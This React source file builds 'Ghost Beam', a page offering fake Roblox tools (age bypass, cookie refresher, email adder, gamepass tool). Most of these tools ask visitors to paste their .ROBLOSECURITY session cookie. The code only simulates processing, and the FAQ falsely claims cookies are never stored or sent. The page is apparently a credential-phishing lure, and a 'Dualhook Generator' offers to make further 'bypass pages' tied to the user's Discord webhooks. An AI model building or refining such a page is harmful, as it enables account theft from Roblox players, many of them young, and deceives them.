import { useState } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import {
  LayoutGrid,
  Shield,
  CheckCircle2,
  RefreshCw,
  Mail,
  Plus,
  Link2,
  Cookie,
  ChevronDown,
  BadgeCheck,
  Lock,
  Loader2,
  X,
  Eye,
  EyeOff,
  Copy,
  Check,
} from 'lucide-react';
import profileImg from '@assets/536a85e52aaf91401cd105108c599245_1784941568122.jpg';

/* ─────────────────────────────────────────
   TOOL DEFINITIONS
───────────────────────────────────────── */
interface ToolDef {
  id: string;
  name: string;
  desc: string;
  subtitle: string;
  btnLabel: string;
  btnColor: string;
  Icon: React.ElementType;
}

const TOOLS: ToolDef[] = [
  {
    id: 'age',
    name: 'Age Bypasser',
    desc: 'Bypass age restrictions on Roblox accounts',
    subtitle: 'Instant account unlock',
    btnLabel: 'Bypass Age',
    btnColor: 'bg-[#0f2a1a] border-green-800/50 text-green-400 hover:bg-[#142f1f]',
    Icon: Shield,
  },
  {
    id: 'checker',
    name: 'Account Checker',
    desc: 'Check account details and inventory',
    subtitle: 'View full account info',
    btnLabel: 'Check Account',
    btnColor: 'bg-[#0f1e2a] border-blue-800/50 text-blue-400 hover:bg-[#132535]',
    Icon: CheckCircle2,
  },
  {
    id: 'refresh',
    name: 'Cookie Refresher',
    desc: 'Refresh your Roblox cookie',
    subtitle: 'Generate new valid cookie',
    btnLabel: 'Refresh Cookie',
    btnColor: 'bg-[#1a1a0f] border-yellow-800/50 text-yellow-400 hover:bg-[#222214]',
    Icon: RefreshCw,
  },
  {
    id: 'email',
    name: 'Email Adder',
    desc: 'Add and verify emails on accounts',
    subtitle: 'Attach email to account',
    btnLabel: 'Add Email',
    btnColor: 'bg-[#1a0f2a] border-purple-800/50 text-purple-400 hover:bg-[#1f1333]',
    Icon: Mail,
  },
  {
    id: 'gamepass',
    name: 'Gamepass Tool',
    desc: 'Create and purchase gamepasses',
    subtitle: 'Instant gamepass creation',
    btnLabel: 'Create Gamepass',
    btnColor: 'bg-[#2a0f1a] border-pink-800/50 text-pink-400 hover:bg-[#33131f]',
    Icon: Plus,
  },
  {
    id: 'dual',
    name: 'Dualhook Generator',
    desc: 'Generate custom bypass pages with your webhooks',
    subtitle: 'Custom webhook bypass',
    btnLabel: 'Generate',
    btnColor: 'bg-[#0f1f2a] border-cyan-800/50 text-cyan-400 hover:bg-[#132635]',
    Icon: Link2,
  },
  {
    id: 'cleaner',
    name: 'Cookie Cleaner',
    desc: 'Cleans cookies with extra symbols, spaces, or wrappers. Does not change your cookie value — works whether the cookie is valid or not',
    subtitle: 'Remove extra symbols from cookie',
    btnLabel: 'Clean Cookie',
    btnColor: 'bg-[#1a1a1a] border-white/20 text-white/70 hover:bg-[#222]',
    Icon: Cookie,
  },
];

const FAQS = [
  { q: 'Is this safe to use?',               a: 'Ghost Beam uses secure processing and never stores your cookie. Your data is processed locally and never sent to third-party servers.' },
  { q: 'How long does the bypass take?',     a: 'The bypass process typically takes 10–30 seconds depending on server load. Please be patient and do not refresh the page.' },
  { q: 'Why do I need to provide my cookie?', a: 'The .ROBLOSECURITY cookie is required to authenticate with Roblox servers. Without it, we cannot process account modifications.' },
  { q: 'Does it work on all accounts?',      a: 'Ghost Beam works on most Roblox accounts. Some accounts with extra security measures may require additional steps.' },
];

/* ─────────────────────────────────────────
   TOOL CONTENT — per-tool input UI
───────────────────────────────────────── */
function ToolContent({ tool }: { tool: ToolDef }) {
  const [cookie, setCookie]   = useState('');
  const [email, setEmail]     = useState('');
  const [webhook, setWebhook] = useState('');
  const [gameName, setGameName] = useState('');
  const [price, setPrice]     = useState('');
  const [show, setShow]       = useState(false);
  const [running, setRunning] = useState(false);
  const [done, setDone]       = useState(false);
  const [cleaned, setCleaned] = useState('');
  const [copied, setCopied]   = useState(false);

  const run = (e: React.FormEvent) => {
    e.preventDefault();
    if (tool.id === 'cleaner') {
      // Cookie cleaner: strip all non-hex characters outside the token
      const raw = cookie.trim();
      const match = raw.match(/[A-Fa-f0-9_\-]{100,}/);
      setCleaned(match ? match[0] : raw.replace(/[^A-Za-z0-9_\-|.]/g, ''));
      return;
    }
    setRunning(true);
    setTimeout(() => { setRunning(false); setDone(true); }, 2500);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(cleaned).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  // Shared cookie field
  const CookieField = (
    <div className="flex flex-col gap-1.5">
      <div className="flex items-center gap-1.5">
        <Lock className="w-3 h-3 text-white/25" />
        <span className="text-[10px] font-mono tracking-widest text-white/30 uppercase">.roblosecurity</span>
      </div>
      <div className="relative">
        <textarea
          data-testid="input-cookie"
          value={cookie}
          onChange={e => { setCookie(e.target.value); setDone(false); setCleaned(''); }}
          placeholder="Paste your .ROBLOSECURITY cookie here..."
          rows={3}
          className="w-full resize-none rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors font-mono pr-10"
          style={{ WebkitTextSecurity: show ? 'none' : 'disc' } as React.CSSProperties}
        />
        <button
          type="button"
          onClick={() => setShow(s => !s)}
          className="absolute right-2.5 top-2.5 text-white/25 hover:text-white/50 transition-colors"
        >
          {show ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
        </button>
      </div>
    </div>
  );

  return (
    <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] overflow-hidden">
      {/* top label bar */}
      <div className="flex items-center gap-2 px-4 py-2.5 border-b border-white/[0.07]">
        <tool.Icon className="w-3 h-3 text-white/25" />
        <span className="text-[11px] font-mono tracking-widest text-white/35 uppercase">{tool.subtitle}</span>
      </div>

      <form onSubmit={run} className="p-4 flex flex-col gap-3">

        {/* ── warning ── */}
        <div className="rounded-lg bg-black/60 border border-white/[0.06] px-3 py-2 font-mono text-[10px] leading-5 text-white/25">
          _WARNING: DO NOT SHARE-<br />
          someone-to-log-in-as-you.<br />
          11items
        </div>

        {/* ── tool-specific fields ── */}
        {(tool.id === 'age' || tool.id === 'checker' || tool.id === 'refresh') && (
          CookieField
        )}

        {tool.id === 'email' && (
          <>
            {CookieField}
            <div className="flex flex-col gap-1.5">
              <span className="text-[10px] font-mono tracking-widest text-white/30 uppercase flex items-center gap-1.5">
                <Mail className="w-3 h-3 text-white/25" /> Email address
              </span>
              <input
                type="email"
                value={email}
                onChange={e => { setEmail(e.target.value); setDone(false); }}
                placeholder="Enter email to add..."
                className="w-full rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors"
              />
            </div>
          </>
        )}

        {tool.id === 'gamepass' && (
          <>
            {CookieField}
            <div className="flex flex-col gap-1.5">
              <span className="text-[10px] font-mono tracking-widest text-white/30 uppercase flex items-center gap-1.5">
                <Plus className="w-3 h-3 text-white/25" /> Gamepass name
              </span>
              <input
                type="text"
                value={gameName}
                onChange={e => { setGameName(e.target.value); setDone(false); }}
                placeholder="Enter gamepass name..."
                className="w-full rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors"
              />
            </div>
            <div className="flex flex-col gap-1.5">
              <span className="text-[10px] font-mono tracking-widest text-white/30 uppercase">Price (Robux)</span>
              <input
                type="number"
                min="0"
                value={price}
                onChange={e => { setPrice(e.target.value); setDone(false); }}
                placeholder="e.g. 100"
                className="w-full rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors"
              />
            </div>
          </>
        )}

        {tool.id === 'dual' && (
          <>
            {CookieField}
            <div className="flex flex-col gap-1.5">
              <span className="text-[10px] font-mono tracking-widest text-white/30 uppercase flex items-center gap-1.5">
                <Link2 className="w-3 h-3 text-white/25" /> Webhook URL
              </span>
              <input
                type="url"
                value={webhook}
                onChange={e => { setWebhook(e.target.value); setDone(false); }}
                placeholder="https://discord.com/api/webhooks/..."
                className="w-full rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors"
              />
            </div>
          </>
        )}

        {tool.id === 'cleaner' && (
          <>
            {CookieField}
            {/* cleaned output */}
            {cleaned && (
              <div className="flex flex-col gap-1.5">
                <span className="text-[10px] font-mono tracking-widest text-green-500/60 uppercase">Cleaned cookie</span>
                <div className="relative">
                  <div className="rounded-lg bg-black/60 border border-green-800/30 px-3 py-2.5 text-[10px] font-mono text-green-400/80 break-all leading-relaxed pr-9">
                    {cleaned}
                  </div>
                  <button
                    type="button"
                    onClick={copyToClipboard}
                    className="absolute right-2.5 top-2.5 text-white/25 hover:text-white/60 transition-colors"
                  >
                    {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>
            )}
          </>
        )}

        {/* ── action button ── */}
        <button
          data-testid={`button-run-${tool.id}`}
          type="submit"
          disabled={running}
          className={`w-full rounded-xl py-3 flex items-center justify-center gap-2 text-sm font-semibold transition-all border active:scale-[0.98] disabled:opacity-60 ${tool.btnColor}`}
        >
          {running ? (
            <><Loader2 className="w-4 h-4 animate-spin" /> Verificando...</>
          ) : done ? (
            <><Check className="w-4 h-4" /> Concluido!</>
          ) : (
            <><tool.Icon className="w-4 h-4" /> {tool.btnLabel}</>
          )}
        </button>

      </form>
    </div>
  );
}

/* ─────────────────────────────────────────
   MAIN APP
───────────────────────────────────────── */
export default function App() {
  const [showDiscord, setShowDiscord] = useState(true);
  const [toolsOpen, setToolsOpen]   = useState(false);
  const [activeId, setActiveId]     = useState('age');

  const activeTool = TOOLS.find(t => t.id === activeId)!;

  return (
    <div className="min-h-screen bg-black text-white font-sans">
      <div className="relative mx-auto max-w-[480px] min-h-screen flex flex-col overflow-hidden">

        {/* HEADER */}
        <header className="flex items-center justify-between px-4 py-3 border-b border-white/[0.07]">
          <span className="text-xs font-semibold tracking-[0.18em] uppercase text-white/80">Ghost Beam</span>
          <button
            data-testid="button-open-tools"
            onClick={() => setToolsOpen(true)}
            className="p-1 text-white/50 hover:text-white transition-colors"
          >
            <LayoutGrid className="w-5 h-5" />
          </button>
        </header>

        {/* BODY */}
        <main className="flex-1 flex flex-col gap-3 px-4 py-4 overflow-y-auto">

          {/* ANNOUNCEMENT CARD */}
          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] p-4">
            <div className="flex items-center gap-2 mb-3">
              <span className="w-2 h-2 rounded-full bg-red-500" />
              <span className="text-[10px] font-bold tracking-[0.2em] uppercase text-red-400">Announcement</span>
            </div>
            <div className="flex items-start gap-3">
              <img
                src={profileImg}
                alt="Mzk"
                className="w-9 h-9 rounded-full object-cover border border-white/10 flex-shrink-0"
              />
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-1 mb-1">
                  <span className="text-sm font-bold text-white">Mzk</span>
                  <BadgeCheck className="w-3.5 h-3.5 text-blue-400 flex-shrink-0" />
                  <span className="text-[11px] text-white/30 truncate">ov</span>
                </div>
                <p className="text-[12px] text-white/55 leading-relaxed">
                  The Age Bypasser is back online. You can now bypass age restrictions on your account again. Thank you for your patience.
                </p>
              </div>
            </div>
          </div>

          {/* ACTIVE TOOL ROW — updates on tool switch */}
          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] p-4 flex items-center gap-3">
            <div className="w-9 h-9 rounded-full border border-white/10 bg-white/[0.04] flex items-center justify-center flex-shrink-0">
              <activeTool.Icon className="w-4 h-4 text-white/70" />
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-sm font-semibold text-white truncate">{activeTool.name}</p>
              <p className="text-[11px] text-white/35 truncate">{activeTool.subtitle}</p>
            </div>
          </div>

          {/* TOOL-SPECIFIC CONTENT — re-mounts on switch so state resets */}
          <AnimatePresence mode="wait">
            <motion.div
              key={activeId}
              initial={{ opacity: 0, y: 6 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -6 }}
              transition={{ duration: 0.15 }}
            >
              <ToolContent tool={activeTool} />
            </motion.div>
          </AnimatePresence>

          {/* FAQ */}
          <div className="flex flex-col gap-2 mt-1 mb-2">
            <p className="text-[10px] font-bold tracking-[0.2em] uppercase text-white/30 px-1">FAQ</p>
            {FAQS.map((faq, i) => <FaqItem key={i} q={faq.q} a={faq.a} />)}
          </div>

        </main>

        {/* FOOTER */}
        <footer className="py-3 border-t border-white/[0.06] text-center">
          <span className="text-[10px] tracking-widest text-white/15 uppercase">Ghost Beam Tools v1.0</span>
        </footer>

        {/* ── TOOLS PANEL ── */}
        <AnimatePresence>
          {toolsOpen && (
            <>
              <motion.div
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                transition={{ duration: 0.15 }}
                className="absolute inset-0 z-40 bg-black/60 backdrop-blur-[2px]"
                onClick={() => setToolsOpen(false)}
              />
              <motion.div
                initial={{ x: '100%' }} animate={{ x: 0 }} exit={{ x: '100%' }}
                transition={{ type: 'tween', ease: 'easeOut', duration: 0.22 }}
                className="absolute top-0 right-0 bottom-0 z-50 w-[78%] bg-[#0a0a0a] border-l border-white/[0.08] flex flex-col"
              >
                <div className="flex items-start justify-between px-5 py-4 border-b border-white/[0.08]">
                  <div>
                    <p className="text-sm font-bold text-white tracking-wide">TOOLS</p>
                    <p className="text-[11px] text-white/35 mt-0.5">Select a tool to use</p>
                  </div>
                  <button
                    data-testid="button-close-tools"
                    onClick={() => setToolsOpen(false)}
                    className="border border-white/15 rounded p-1 text-white/40 hover:text-white transition-colors"
                  >
                    <LayoutGrid className="w-4 h-4" />
                  </button>
                </div>

                <div className="flex-1 overflow-y-auto px-3 py-3 flex flex-col gap-1.5">
                  {TOOLS.map(tool => {
                    const active = tool.id === activeId;
                    const { Icon } = tool;
                    return (
                      <button
                        key={tool.id}
                        data-testid={`tool-item-${tool.id}`}
                        onClick={() => { setActiveId(tool.id); setToolsOpen(false); }}
                        className={`w-full text-left flex items-start gap-3 px-3 py-3 rounded-xl border transition-colors ${
                          active
                            ? 'bg-blue-950/50 border-blue-700/30'
                            : 'bg-transparent border-transparent hover:bg-white/[0.04]'
                        }`}
                      >
                        <div className={`mt-0.5 w-8 h-8 rounded-full flex items-center justify-center border flex-shrink-0 ${
                          active
                            ? 'border-blue-500/30 bg-blue-900/30'
                            : 'border-white/[0.09] bg-white/[0.03]'
                        }`}>
                          <Icon className={`w-3.5 h-3.5 ${active ? 'text-blue-300' : 'text-white/40'}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className={`text-[13px] font-semibold leading-tight ${active ? 'text-white' : 'text-white/75'}`}>
                            {tool.name}
                          </p>
                          <p className="text-[11px] text-white/35 mt-0.5 leading-relaxed">{tool.desc}</p>
                        </div>
                        {active && <span className="mt-1.5 w-2 h-2 rounded-full bg-blue-400 flex-shrink-0" />}
                      </button>
                    );
                  })}
                </div>
              </motion.div>
            </>
          )}
        </AnimatePresence>

        {/* ── DISCORD MODAL ── */}
        <AnimatePresence>
          {showDiscord && (
            <motion.div
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              className="absolute inset-0 z-[100] bg-black/75 flex items-center justify-center px-6"
            >
              <motion.div
                initial={{ scale: 0.95, y: 12 }} animate={{ scale: 1, y: 0 }}
                exit={{ scale: 0.95, y: 12 }}
                transition={{ type: 'spring', stiffness: 320, damping: 28 }}
                className="w-full max-w-sm rounded-2xl border border-white/[0.1] bg-[#0d0d0d] overflow-hidden"
              >
                <div className="flex items-start justify-between px-5 pt-5 pb-4 border-b border-white/[0.07]">
                  <div>
                    <p className="text-base font-bold text-white">Join Our Community</p>
                    <p className="text-xs text-white/40 mt-0.5">Connect with thousands of users</p>
                  </div>
                  <button
                    data-testid="button-close-discord"
                    onClick={() => setShowDiscord(false)}
                    className="text-white/30 hover:text-white transition-colors mt-0.5"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>
                <div className="p-5 flex flex-col gap-3">
                  <div className="flex items-center gap-3 bg-white/[0.04] border border-white/[0.07] rounded-xl p-3">
                    <div className="w-10 h-10 rounded-xl bg-[#5865F2] flex items-center justify-center flex-shrink-0">
                      <DiscordIcon className="w-6 h-6 text-white" />
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-white">Ghost Beam Community</p>
                      <div className="flex items-center gap-1.5 mt-0.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-green-500" />
                        <span className="text-[11px] text-white/40">Active Support</span>
                      </div>
                    </div>
                  </div>
                  <a
                    data-testid="link-join-discord"
                    href="https://discord.gg/zxNqr8Zpd"
                    target="_blank"
                    rel="noreferrer"
                    onClick={() => setShowDiscord(false)}
                    className="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold py-3 rounded-xl transition-colors text-sm text-center flex items-center justify-center gap-2"
                  >
                    <DiscordIcon className="w-4 h-4" />
                    Join Discord Server
                  </a>
                  <button
                    data-testid="button-maybe-later"
                    onClick={() => setShowDiscord(false)}
                    className="text-xs text-white/25 hover:text-white/50 transition-colors text-center py-1"
                  >
                    Maybe Later
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>

      </div>
    </div>
  );
}

/* ─────────────────────────────────────────
   FAQ ITEM
───────────────────────────────────────── */
function FaqItem({ q, a }: { q: string; a: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="rounded-xl border border-white/[0.07] bg-[#0d0d0d] overflow-hidden">
      <button
        onClick={() => setOpen(o => !o)}
        className="w-full flex items-center justify-between px-4 py-3.5 text-left gap-3"
      >
        <span className="text-[13px] text-white/60">{q}</span>
        <ChevronDown className={`w-4 h-4 text-white/25 flex-shrink-0 transition-transform duration-200 ${open ? 'rotate-180' : ''}`} />
      </button>
      <AnimatePresence>
        {open && (
          <motion.div
            initial={{ height: 0 }} animate={{ height: 'auto' }} exit={{ height: 0 }}
            transition={{ duration: 0.18 }}
            className="overflow-hidden"
          >
            <p className="px-4 pb-4 text-xs text-white/35 leading-relaxed border-t border-white/[0.05] pt-3">{a}</p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

/* ─────────────────────────────────────────
   DISCORD ICON
───────────────────────────────────────── */
function DiscordIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 127.14 96.36" fill="currentColor">
      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.31,60,73.31,53s5-12.74,11.43-12.74S96.2,46,96.12,53,91.08,65.69,84.69,65.69Z" />
    </svg>
  );
}
